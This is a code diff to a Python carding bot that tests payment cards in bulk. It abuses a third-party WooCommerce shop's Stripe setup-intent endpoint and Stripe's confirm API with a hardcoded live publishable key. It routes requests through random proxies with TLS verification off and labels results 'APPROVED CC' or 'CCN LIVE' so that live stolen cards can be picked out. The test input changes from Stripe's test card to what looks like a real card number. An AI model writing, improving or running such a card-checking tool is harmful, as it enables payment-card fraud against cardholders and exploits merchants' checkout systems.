@@ -8,27 +8,13 @@ from bs4 import BeautifulSoup
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# Multiple Stripe API keys for better success
-STRIPE_KEYS = [
-    "pk_live_51LPHnuAPNhSDWD7S7BcyuFczoPvly21Beb58T0NLyxZctbTMscpsqkAMCAUVd37qe4jAXCWSKCGqZOLO88lMAYBD00VBQbfSTm",
-    "pk_live_51Hr5EEKpRNaslz0j7A6MTkt9lX9u6pQk0qYr6qy6vW5t6qJZz1Xr8Y6qy6vW5t6qJZz1Xr8Y6qy6vW5t6qJZz1Xr8Y",
-    "pk_live_51JqY7ZKpRNaslz0j7A6MTkt9lX9u6pQk0qYr6qy6vW5t6qJZz1Xr8Y6qy6vW5t6qJZz1Xr8Y6qy6vW5t6qJZz1Xr8Y"
-]
-
-# Multiple endpoints to try
-STRIPE_ENDPOINTS = [
-    "https://shopzone.nz/?wc-ajax=wc_stripe_frontend_request&path=/wc-stripe/v1/setup-intent",
-    "https://api.stripe.com/v1/setup_intents",
-    "https://checkout.stripe.com/v1/setup_intents"
-]
-
 # Configuration
 CCN_WRONG_KEYWORDS = [
     "incorrect_cvc", "cvc_check: fail", "invalid_cvc", "cvv_decline",
     "declined_cvv", "wrong_cvc", "cvc_failure", "cvv_check: incorrect",
     "Your card's security code is incorrect.", "The CVC code is incorrect.",
     "CVC mismatch", "security code incorrect", "card live - cvv wrong",
-    "live ccn", "cvc does not match", "cvc_invalid", "cvv_failed"
+    "live ccn", "cvc does not match"
 ]
 
 CVV_LIVE_KEYWORDS = [
@@ -38,7 +24,7 @@ CVV_LIVE_KEYWORDS = [
     "card_live", "live cvv", "Your payment method was saved",
     "Card successfully added", "Card has been verified",
     "Payment method added successfully", "SetupIntent status: succeeded",
-    "Payment method saved", "tokenized", "successful", "approved"
+    "Payment method saved"
 ]
 
 def get_random_proxy():
@@ -109,23 +95,15 @@ def get_bin_info(bin_number):
         }
 
 def classify_response(res):
-    if isinstance(res, str):
-        # Check if it's a string response that might indicate success
-        if any(keyword in res.lower() for keyword in CVV_LIVE_KEYWORDS):
-            return "APPROVED CC", res, True
-        return "DECLINED CC", res, False
-        
     raw_text = json.dumps(res).lower()
     
     if res.get("status") == "succeeded":
         return "APPROVED CC", "succeeded", True
     
-    # Check for various success indicators
     for keyword in CVV_LIVE_KEYWORDS:
         if keyword.lower() in raw_text:
             return "APPROVED CC", res.get("status", "unknown"), True
             
-    # Check for CCN patterns (card is live but CVV wrong)
     for keyword in CCN_WRONG_KEYWORDS:
         if keyword.lower() in raw_text:
             return "CCN LIVE", res.get("error", {}).get("decline_code", ""), True
@@ -133,7 +111,7 @@ def classify_response(res):
     return "DECLINED CC", res.get("error", {}).get("message", ""), False
 
 def check_card_stripe(cc_line):
-    """Check a single card using Stripe gateway with multiple fallbacks"""
+    """Check a single card using Stripe gateway - Using the original working method"""
     start_time = time.time()
     
     try:
@@ -144,100 +122,124 @@ def check_card_stripe(cc_line):
         # Get proxy
         proxy = get_random_proxy()
         
-        # Try multiple API keys and endpoints
-        for stripe_key in STRIPE_KEYS:
-            for endpoint in STRIPE_ENDPOINTS:
-                try:
-                    # Get setup intent
-                    setup = requests.post(
-                        endpoint,
-                        data={"payment_method": "stripe_cc"},
-                        headers={
-                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
-                            "Accept": "application/json",
-                            "Content-Type": "application/x-www-form-urlencoded"
-                        },
-                        proxies=proxy,
-                        timeout=15,
-                        verify=False
-                    )
-                    
-                    if setup.status_code != 200:
-                        continue
-                    
-                    setup_text = setup.text
-                    
-                    # Try to extract client_secret using different methods
-                    client_secret = None
-                    secret = None
-                    
-                    # Method 1: JSON parsing
-                    try:
-                        setup_data = setup.json()
-                        client_secret = setup_data.get("client_secret", "")
-                        if client_secret:
-                            secret_parts = client_secret.split("_secret_")
-                            if len(secret_parts) >= 2:
-                                secret = secret_parts[0]
-                    except:
-                        pass
-                    
-                    # Method 2: String extraction (original method)
-                    if not client_secret and '{"client_secret":"' in setup_text:
-                        try:
-                            client_secret = setup_text.split('{"client_secret":"')[1].split('"}')[0]
-                            secret = setup_text.split('{"client_secret":"')[1].split('_secret_')[0]
-                        except:
-                            pass
-                    
-                    # Method 3: Regex extraction
-                    if not client_secret:
-                        match = re.search(r'"client_secret":"([^"]+)"', setup_text)
-                        if match:
-                            client_secret = match.group(1)
-                            secret_parts = client_secret.split("_secret_")
-                            if len(secret_parts) >= 2:
-                                secret = secret_parts[0]
-                    
-                    if not client_secret or not secret:
-                        continue
-                    
-                    # Confirm the setup intent with card details
-                    confirm = requests.post(
-                        f"https://api.stripe.com/v1/setup_intents/{secret}/confirm",
-                        data={
-                            "payment_method_data[type]": "card",
-                            "payment_method_data[card][number]": n,
-                            "payment_method_data[card][cvc]": cvc,
-                            "payment_method_data[card][exp_month]": mm,
-                            "payment_method_data[card][exp_year]": yy,
-                            "payment_method_data[billing_details][address][postal_code]": "10080",
-                            "use_stripe_sdk": "true",
-                            "key": stripe_key,
-                            "client_secret": client_secret
-                        },
-                        headers={
-                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
-                            "Content-Type": "application/x-www-form-urlencoded"
-                        },
-                        proxies=proxy,
-                        timeout=15,
-                        verify=False
-                    )
-                    
-                    elapsed_time = time.time() - start_time
-                    
-                    if confirm.status_code != 200:
-                        continue
-                    
-                    response_data = confirm.json()
-                    status, reason, approved = classify_response(response_data)
-                    bin_info = get_bin_info(n[:6])
-                    
-                    # Format the response
-                    status_icon = '✅' if approved else '❌'
-                    
-                    response_text = f"""
+        # Get setup intent using the original working method
+        setup = requests.post(
+            "https://shopzone.nz/?wc-ajax=wc_stripe_frontend_request&path=/wc-stripe/v1/setup-intent",
+            data={"payment_method": "stripe_cc"},
+            headers={
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
+                "Accept": "application/json",
+                "Content-Type": "application/x-www-form-urlencoded"
+            },
+            proxies=proxy,
+            timeout=30,
+            verify=False
+        )
+        
+        if setup.status_code != 200:
+            elapsed_time = time.time() - start_time
+            return f"""
+❌ SETUP FAILED ❌
+
+💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Setup failed with status {setup.status_code}
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth
+
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
+        
+        # Extract client_secret using the original method from cc.py
+        setup_text = setup.text
+        
+        # Try multiple extraction methods
+        client_secret = None
+        secret = None
+        
+        # Method 1: Original string splitting
+        try:
+            if '{"client_secret":"' in setup_text:
+                client_secret = setup_text.split('{"client_secret":"')[1].split('"}')[0]
+                secret = setup_text.split('{"client_secret":"')[1].split('_secret_')[0]
+        except:
+            pass
+        
+        # Method 2: Regex fallback
+        if not client_secret:
+            match = re.search(r'"client_secret":"([^"]+)"', setup_text)
+            if match:
+                client_secret = match.group(1)
+                secret_parts = client_secret.split("_secret_")
+                if len(secret_parts) >= 2:
+                    secret = secret_parts[0]
+        
+        if not client_secret or not secret:
+            elapsed_time = time.time() - start_time
+            return f"""
+❌ SETUP FAILED ❌
+
+💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Client secret not found in response
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth
+
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
+
+        # Confirm the setup intent with card details
+        confirm = requests.post(
+            f"https://api.stripe.com/v1/setup_intents/{secret}/confirm",
+            data={
+                "payment_method_data[type]": "card",
+                "payment_method_data[card][number]": n,
+                "payment_method_data[card][cvc]": cvc,
+                "payment_method_data[card][exp_month]": mm,
+                "payment_method_data[card][exp_year]": yy,
+                "payment_method_data[billing_details][address][postal_code]": "10080",
+                "use_stripe_sdk": "true",
+                "key": "pk_live_51LPHnuAPNhSDWD7S7BcyuFczoPvly21Beb58T0NLyxZctbTMscpsqkAMCAUVd37qe4jAXCWSKCGqZOLO88lMAYBD00VBQbfSTm",
+                "client_secret": client_secret
+            },
+            headers={
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
+                "Content-Type": "application/x-www-form-urlencoded"
+            },
+            proxies=proxy,
+            timeout=30,
+            verify=False
+        )
+        
+        elapsed_time = time.time() - start_time
+        
+        if confirm.status_code != 200:
+            try:
+                error_data = confirm.json()
+                error_msg = error_data.get("error", {}).get("message", "Unknown error")
+            except:
+                error_msg = f"Status: {confirm.status_code}"
+                
+            return f"""
+❌ CONFIRMATION FAILED ❌
+
+💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth
+
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
+            
+        response_data = confirm.json()
+        status, reason, approved = classify_response(response_data)
+        bin_info = get_bin_info(n[:6])
+        
+        # Format the response similar to your p.py format
+        status_icon = '✅' if approved else '❌'
+        
+        response_text = f"""
 {status} {status_icon}
 
 💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
@@ -251,24 +253,7 @@ def check_card_stripe(cc_line):
 
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
 """
-                    return response_text
-                    
-                except:
-                    continue
-        
-        # If all methods failed
-        elapsed_time = time.time() - start_time
-        return f"""
-❌ ALL METHODS FAILED ❌
-
-💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
-🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ All Stripe endpoints failed
-💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth
-
-🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
-
-🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
-"""
+        return response_text
 
     except Exception as e:
         elapsed_time = time.time() - start_time
@@ -296,6 +281,6 @@ def check_cards_stripe(cards_list):
 # For standalone testing
 if __name__ == "__main__":
     # Test with a single card
-    test_card = "4242424242424242|12|2025|123"  # Stripe test card that should approve
+    test_card = "4556737586899855|12|2026|123"
     result = check_card_stripe(test_card)
     print(result)
